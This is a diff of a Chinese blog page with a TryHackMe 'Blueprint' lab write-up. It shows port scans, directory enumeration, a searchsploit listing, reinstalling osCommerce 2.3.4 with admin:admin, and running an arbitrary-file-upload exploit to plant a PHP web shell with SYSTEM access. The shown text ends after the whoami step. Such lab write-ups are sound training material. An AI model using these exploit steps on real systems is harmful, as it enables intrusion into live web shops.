@@ -1,20 +1,20 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Buleprint | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Blueprint Hack into this Windows machine and escalate your privileges to Administrator.  端口扫描，有很多端口    序号 Host 地址 端口 协议 Uri 地址 标题 Banner 状态码    1 10.144.148.185 443 HTTPS https:&#x2F;&#x2F;10.144.148.185:443 In">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Blueprint | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Blueprint Hack into this Windows machine and escalate your privileges to Administrator.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TryHackMe_Buleprint">
+<meta property="og:title" content="TryHackMe_Blueprint">
 <meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html">
 <meta property="og:site_name" content="X9wd09ncc">
-<meta property="og:description" content="Blueprint Hack into this Windows machine and escalate your privileges to Administrator.  端口扫描，有很多端口    序号 Host 地址 端口 协议 Uri 地址 标题 Banner 状态码    1 10.144.148.185 443 HTTPS https:&#x2F;&#x2F;10.144.148.185:443 In">
+<meta property="og:description" content="Blueprint Hack into this Windows machine and escalate your privileges to Administrator.">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
 <meta property="article:published_time" content="2026-05-12T11:30:03.000Z">
-<meta property="article:modified_time" content="2026-05-17T10:13:34.422Z">
+<meta property="article:modified_time" content="2026-06-03T08:49:40.168Z">
 <meta property="article:author" content="X9wd09ncc">
 <meta property="article:tag" content="thm">
 <meta property="article:tag" content="easy">
 <meta property="article:tag" content="红队">
 <meta property="article:tag" content="oscommerce">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Blueprint.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
@@ -43,8 +43,8 @@
   Snackbar: undefined,
   source: {
     justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
     }
   },
   isPhotoFigcaption: false,
@@ -56,12 +56,12 @@
   },
   autoDarkmode: false
 }</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'TryHackMe_Buleprint',
+  title: 'TryHackMe_Blueprint',
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2026-05-17 18:13:34'
+  isToc: true,
+  postUpdate: '2026-06-03 16:49:40'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -150,13 +150,22 @@
           if (t === 'dark') activateDarkMode()
           else if (t === 'light') activateLightMode()
         
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
     const detectApple = () => {
       if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
         document.documentElement.classList.add('apple')
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
 </head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
   endLoading: () => {
     document.body.style.overflow = '';
@@ -174,222 +183,167 @@ window.addEventListener('load',()=> { preloader.endLoading() })
 if (false) {
   document.addEventListener('pjax:send', () => { preloader.initLoading() })
   document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Buleprint</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-12T11:30:03.000Z" title="发表于 2026-05-12 19:30:03">2026-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T10:13:34.422Z" title="更新于 2026-05-17 18:13:34">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Blueprint"><a href="#Blueprint" class="headerlink" title="Blueprint"></a>Blueprint</h1><blockquote>
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Blueprint</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-12T11:30:03.000Z" title="发表于 2026-05-12 19:30:03">2026-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-03T08:49:40.168Z" title="更新于 2026-06-03 16:49:40">2026-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Blueprint"><a href="#Blueprint" class="headerlink" title="Blueprint"></a>Blueprint</h1><blockquote>
 <p>Hack into this Windows machine and escalate your privileges to Administrator.</p>
 </blockquote>
-<p>端口扫描，有很多端口</p>
-<table>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table>
 <thead>
 <tr>
-<th>序号</th>
-<th>Host 地址</th>
-<th>端口</th>
-<th>协议</th>
-<th>Uri 地址</th>
-<th>标题</th>
-<th>Banner</th>
-<th>状态码</th>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="left">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>1</td>
-<td>10.144.148.185</td>
-<td>443</td>
-<td>HTTPS</td>
-<td><a target="_blank" rel="noopener" href="https://10.144.148.185/">https://10.144.148.185:443</a></td>
-<td>Index of &#x2F;</td>
-<td>Apache-HTTP-Server&#x2F;2.4.23,Apache-Web-Server,Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28, 列目录</td>
-<td>200</td>
+<td align="center">1</td>
+<td align="left">10.144.148.185</td>
+<td align="left">443</td>
+<td align="left">HTTPS</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://10.144.148.185/">https://10.144.148.185:443</a></td>
+<td align="left">Index of &#x2F;</td>
+<td align="left">Apache-HTTP-Server&#x2F;2.4.23,Apache-Web-Server,Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28, 列目录</td>
+<td align="center">200</td>
 </tr>
 <tr>
-<td>2</td>
-<td>10.144.148.185</td>
-<td>80</td>
-<td>HTTP</td>
-<td>10.144.148.185:80</td>
-<td></td>
-<td>UnKnown</td>
-<td>0</td>
+<td align="center">2</td>
+<td align="left">10.144.148.185</td>
+<td align="left">80</td>
+<td align="left">HTTP</td>
+<td align="left">10.144.148.185:80</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
 </tr>
 <tr>
-<td>3</td>
-<td>10.144.148.185</td>
-<td>3306</td>
-<td>MYSQL</td>
-<td>10.144.148.185:3306</td>
-<td></td>
-<td>UnKnown</td>
-<td>0</td>
+<td align="center">3</td>
+<td align="left">10.144.148.185</td>
+<td align="left">3306</td>
+<td align="left">MYSQL</td>
+<td align="left">10.144.148.185:3306</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
 </tr>
 <tr>
-<td>4</td>
-<td>10.144.148.185</td>
-<td>135</td>
-<td>RPC</td>
-<td>10.144.148.185:135</td>
-<td></td>
-<td>Microsoft Windows RPC</td>
-<td>0</td>
+<td align="center">4</td>
+<td align="left">10.144.148.185</td>
+<td align="left">135</td>
+<td align="left">RPC</td>
+<td align="left">10.144.148.185:135</td>
+<td align="left"></td>
+<td align="left">Microsoft Windows RPC</td>
+<td align="center">0</td>
 </tr>
 <tr>
-<td>5</td>
-<td>10.144.148.185</td>
-<td>139</td>
-<td>NETBIOS</td>
-<td>10.144.148.185:139</td>
-<td></td>
-<td>Microsoft Windows netbios-ssn</td>
-<td>0</td>
+<td align="center">5</td>
+<td align="left">10.144.148.185</td>
+<td align="left">139</td>
+<td align="left">NETBIOS</td>
+<td align="left">10.144.148.185:139</td>
+<td align="left"></td>
+<td align="left">Microsoft Windows netbios-ssn</td>
+<td align="center">0</td>
 </tr>
 <tr>
-<td>6</td>
-<td>10.144.148.185</td>
-<td>8080</td>
-<td>HTTP</td>
-<td><a target="_blank" rel="noopener" href="http://10.144.148.185:8080/">http://10.144.148.185:8080</a></td>
-<td>Index of &#x2F;</td>
-<td>Apache-Web-Server, 列目录，Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28,Apache-HTTP-Server&#x2F;2.4.23</td>
-<td>200</td>
+<td align="center">6</td>
+<td align="left">10.144.148.185</td>
+<td align="left">8080</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.144.148.185:8080/">http://10.144.148.185:8080</a></td>
+<td align="left">Index of &#x2F;</td>
+<td align="left">Apache-Web-Server, 列目录，Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2h PHP&#x2F;5.6.28,Apache-HTTP-Server&#x2F;2.4.23</td>
+<td align="center">200</td>
 </tr>
 <tr>
-<td>7</td>
-<td>10.144.148.185</td>
-<td>445</td>
-<td>SMB</td>
-<td>10.144.148.185:445</td>
-<td></td>
-<td>UnKnown</td>
-<td>0</td>
+<td align="center">7</td>
+<td align="left">10.144.148.185</td>
+<td align="left">445</td>
+<td align="left">SMB</td>
+<td align="left">10.144.148.185:445</td>
+<td align="left"></td>
+<td align="left">UnKnown</td>
+<td align="center">0</td>
 </tr>
 </tbody></table>
-<p>访问 <code>8080</code> 端口，是一个文件目录，依次点击来到 <code>/oscommerce-2.3.4/catalog</code>，是一个网页</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>访问 <code>8080</code> 端口，是一个文件目录，依次点击来到 <code>/oscommerce-2.3.4/catalog</code>，是一个网页</p>
 <p>根据路径知道使用了 <code>oscommerce-2.3.4</code></p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/port_8080.png" alt="port_8080"></p>
-<p>先来目录扫描，得到了有 <code>admin</code>，<code>download</code>，<code>install</code> 等地址</p>
-<pre class="line-numbers language-none"><code class="language-none"># gobuster dir -u http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;  -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt  
+<p><img src="/../image/TryHackMe/easy/Blueprint/port_8080.png" alt="8080 端口页面"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.144.148.185:8080/oscommerce-2.3.4/catalog/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
 
-&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
-admin                (Status: 301) [Size: 373] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;admin&#x2F;]
-download             (Status: 401) [Size: 1322]
-ext                  (Status: 301) [Size: 371] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;ext&#x2F;]
-images               (Status: 301) [Size: 374] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;images&#x2F;]
-includes             (Status: 301) [Size: 376] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;includes&#x2F;]
-index.php            (Status: 200) [Size: 15466]
-install              (Status: 301) [Size: 375] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;install&#x2F;]
-pub                  (Status: 301) [Size: 371] [--&gt; http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;pub&#x2F;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>目录扫描的同时用 <code>searchsploit</code> 搜索相关漏洞</p>
+<p>得到以下目录：</p>
+<ul>
+<li><code>/admin</code> (Status: 301)</li>
+<li><code>/download</code> (Status: 401)</li>
+<li><code>/ext</code> (Status: 301)</li>
+<li><code>/images</code> (Status: 301)</li>
+<li><code>/includes</code> (Status: 301)</li>
+<li><code>/index.php</code> (Status: 200)</li>
+<li><code>/install</code> (Status: 301)</li>
+<li><code>/pub</code> (Status: 301)</li>
+</ul>
+<h3 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h3><p>目录扫描的同时用 <code>searchsploit</code> 搜索相关漏洞</p>
 <p>可以利用的有文件上传和远程代码执行</p>
-<pre class="line-numbers language-none"><code class="language-none"># searchsploit oscommerce 2.3.4
-------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                   |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
-osCommerce 2.3.4 - Multiple Vulnerabilities                                                      | php&#x2F;webapps&#x2F;34582.txt
-osCommerce 2.3.4.1 - &#39;currency&#39; SQL Injection                                                    | php&#x2F;webapps&#x2F;46328.txt
-osCommerce 2.3.4.1 - &#39;products_id&#39; SQL Injection                                                 | php&#x2F;webapps&#x2F;46329.txt
-osCommerce 2.3.4.1 - &#39;reviews_id&#39; SQL Injection                                                  | php&#x2F;webapps&#x2F;46330.txt
-osCommerce 2.3.4.1 - &#39;title&#39; Persistent Cross-Site Scripting                                     | php&#x2F;webapps&#x2F;49103.txt
-osCommerce 2.3.4.1 - Arbitrary File Upload                                                       | php&#x2F;webapps&#x2F;43191.py
-osCommerce 2.3.4.1 - Remote Code Execution                                                       | php&#x2F;webapps&#x2F;44374.py
-osCommerce 2.3.4.1 - Remote Code Execution (2)                                                   | php&#x2F;webapps&#x2F;50128.py
-------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit oscommerce 2.3.4</span><br></pre></td></tr></table></figure>
 
-<p>访问扫描出来的地址，在 <code>/oscommerce-2.3.4/catalog/install</code> 发现一个安装页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">osCommerce 2.3.4 - Multiple Vulnerabilities                                                      | php/webapps/34582.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;currency&#x27; SQL Injection                                                    | php/webapps/46328.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;products_id&#x27; SQL Injection                                                 | php/webapps/46329.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;reviews_id&#x27; SQL Injection                                                  | php/webapps/46330.txt</span><br><span class="line">osCommerce 2.3.4.1 - &#x27;title&#x27; Persistent Cross-Site Scripting                                     | php/webapps/49103.txt</span><br><span class="line">osCommerce 2.3.4.1 - Arbitrary File Upload                                                       | php/webapps/43191.py</span><br><span class="line">osCommerce 2.3.4.1 - Remote Code Execution                                                       | php/webapps/44374.py</span><br><span class="line">osCommerce 2.3.4.1 - Remote Code Execution (2)                                                   | php/webapps/50128.py</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="安装-osCommerce"><a href="#安装-osCommerce" class="headerlink" title="安装 osCommerce"></a>安装 osCommerce</h3><p>访问扫描出来的地址，在 <code>/oscommerce-2.3.4/catalog/install</code> 发现一个安装页面</p>
 <p>点击开始按钮安装</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/install.png" alt="install"></p>
-<p>这里数据库服务器地中默认是 <code>localhost</code>，但是我修改为靶场地址后会出错，因此需要修改 <code>hosts </code> 文件</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install.png" alt="安装页面"></p>
+<p>这里数据库服务器地址默认是 <code>localhost</code>，但是我修改为靶场地址后会出错，因此需要修改 <code>hosts</code> 文件</p>
 <p>用户名用 <code>root</code>，无密码，数据库名则是 <code>osCommerce</code></p>
 <p>点击继续按钮</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/install2.png" alt="install2"></p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install2.png" alt="安装配置"></p>
 <p>点击继续按钮</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/install3.png"></p>
-<p>其他信息乱填，管理员账号密码均为 admin</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/install4.png" alt="install4"></p>
-<p>访问 <code>/admin</code>，可以登录</p>
-<p><img src="/../image/TryHackMe/easy/Blueprint/admin.png"></p>
-<p>下载之前搜索到的任意文件上传利用脚本文件 <code>43191.py</code>，上传<code>单文件 PHP shell</code></p>
-<pre class="line-numbers language-none"><code class="language-none"># python2 43191.py -u http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4 --auth&#x3D;admin:admin -f shell.php
-[+] Authentication successful
-[+] Successfully prepared the exploit and created a new newsletter with nID 1
-[+] Successfully locked the newsletter. Now attempting to upload..
-[*] Now trying to verify that the file shell.php uploaded..
-[+] Got a HTTP 200 Reply for the uploaded file!
-[+] The uploaded file should now be available at http:&#x2F;&#x2F;10.144.148.185:8080&#x2F;oscommerce-2.3.4&#x2F;catalog&#x2F;admin&#x2F;shell.php
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install3.png" alt="安装确认"></p>
+<p>其他信息乱填，管理员账号密码均为 <code>admin</code></p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/install4.png" alt="管理员设置"></p>
+<h3 id="文件上传获取-Shell"><a href="#文件上传获取-Shell" class="headerlink" title="文件上传获取 Shell"></a>文件上传获取 Shell</h3><p>访问 <code>/admin</code>，可以登录</p>
+<p><img src="/../image/TryHackMe/easy/Blueprint/admin.png" alt="管理后台"></p>
+<p>下载之前搜索到的任意文件上传利用脚本文件 <code>43191.py</code>，上传单文件 PHP shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 43191.py -u http://10.144.148.185:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Authentication successful</span><br><span class="line">[+] Successfully prepared the exploit and created a new newsletter with nID 1</span><br><span class="line">[+] Successfully locked the newsletter. Now attempting to upload..</span><br><span class="line">[*] Now trying to verify that the file shell.php uploaded..</span><br><span class="line">[+] Got a HTTP 200 Reply for the uploaded file!</span><br><span class="line">[+] The uploaded file should now be available at http://10.144.148.185:8080/oscommerce-2.3.4/catalog/admin/shell.php</span><br></pre></td></tr></table></figure>
 
 <p>访问 <code>/oscommerce-2.3.4/catalog/admin/shell.php</code></p>
-<p>执行 <code>whoami </code>得知是最高权限，进入 <code>Desktop</code> 查看 <code>root.txt.txt</code></p>
-<pre class="line-numbers language-none"><code class="language-none">BLUEPRINT$@BLUEPRINT: C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin # whoami
- nt authority\system
+<p>执行 <code>whoami</code> 得知是最高权限，进入 <code>Desktop</code> 查看 <code>root.txt.txt</code></p>
